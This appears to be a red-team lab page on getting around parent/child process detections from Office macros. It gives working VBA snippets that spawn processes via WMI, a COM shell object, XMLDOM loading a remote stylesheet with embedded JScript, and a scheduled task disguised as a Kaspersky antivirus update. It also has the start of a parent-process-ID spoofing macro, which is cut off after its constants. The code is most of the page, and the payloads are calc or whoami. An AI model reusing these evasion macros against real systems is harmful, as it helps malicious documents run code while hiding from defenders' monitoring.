# Bypassing Parent Child / Ancestry Detections

Defenders often will look engineer detections based on parent/child process relationships - i.e Excel spawns powershel - suspicious.

This lab is mostly based on the techniques discussed on [https://www.countercept.com/blog/dechaining-macros-and-evading-edr/](https://www.countercept.com/blog/dechaining-macros-and-evading-edr/)

Below are some techniques showing how those type of detections could be bypassed. 

## Spawning via WmiPrvse.exe using wmi

{% code-tabs %}
{% code-tabs-item title="macro.vba" %}
```javascript
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set objStartup = objWMIService.Get("Win32_ProcessStartup")
Set objConfig = objStartup.SpawnInstance_
Set objProcess = GetObject("winmgmts:root\cimv2:Win32_Process")
errReturn = objProcess.Create("calc", Null, objConfig, intProcessID)
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Spawning via ShellCOM

{% code-tabs %}
{% code-tabs-item title="macro.vba" %}
```csharp
Set obj = GetObject("new:C08AFD90-F2A1-11D1-8455-00A0C91F3880")
obj.Document.Application.ShellExecute "calc",Null,"C:\\Windows\\System32",Null,0
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Spawning via svchost.exe using XMLDOM

{% code-tabs %}
{% code-tabs-item title="xmldom.vba" %}
```csharp
Set xml = CreateObject("Microsoft.XMLDOM")
xml.async = False
Set xsl = xml
xsl.load("file://|http://bad.xsl")
xml.transformNode xsl
```
{% endcode-tabs-item %}

{% code-tabs-item title="bad.xsl" %}
```markup
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"

	<ms:script implements-prefix="user" language="JScript">

	var r = new ActiveXObject("WScript.Shell").Run("calc");

</stylesheet>
```
{% endcode-tabs-item %}
{% endcode-tabs %}

![](../../../.gitbook/assets/screenshot-from-2019-04-10-23-04-07.png)

## Spawning via svchost.exe using Scheduled Task

{% code-tabs %}
{% code-tabs-item title="macro.vba" %}
```csharp
Set service = CreateObject("Schedule.Service")
Call service.Connect
Dim td: Set td = service.NewTask(0)
td.RegistrationInfo.Author = "Kaspersky Corporation"
td.settings.StartWhenAvailable = True
td.settings.Hidden = False
Dim triggers: Set triggers = td.triggers
Dim trigger: Set trigger = triggers.Create(1)
Dim startTime: ts = DateAdd("s", 30, Now)
startTime = Year(ts) & "-" & Right(Month(ts), 2) & "-" & Right(Day(ts), 2) & "T" & Right(Hour(ts), 2) & ":" & Right(Minute(ts), 2) & ":" & Right(Second(ts), 2)
trigger.StartBoundary = startTime
trigger.ID = "TimeTriggerId"
Dim Action: Set Action = td.Actions.Create(0)
Action.Path = "C:\Windows\System32\cmd.exe"
'Action.Arguments = "/c whoami"
Call service.GetFolder("\").RegisterTaskDefinition("AVUpdateTask", td, 6, , , 3)
```
{% endcode-tabs-item %}
{% endcode-tabs %}

## Parent Process ID Spoofing

With this technique it is possible to specify the PID under which our process will be launched as well as process commandline arguments can be spoofed. Note that this is the same technique Cobalt Strike uses under the hood in its `argue` module:

```csharp
' code from https://blog.christophetd.fr/building-an-office-macro-to-spoof-process-parent-and-command-line/
' Windows API constants

Const EXTENDED_STARTUPINFO_PRESENT = &H80000
Const HEAP_ZERO_MEMORY = &H8&
Const SW_HIDE = &H0&
Const PROCESS_ALL_ACCESS = &H1F0FFF
Const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = &H20000
Const TH32CS_SNAPPROCESS = &H2&
Const MAX_PATH = 260
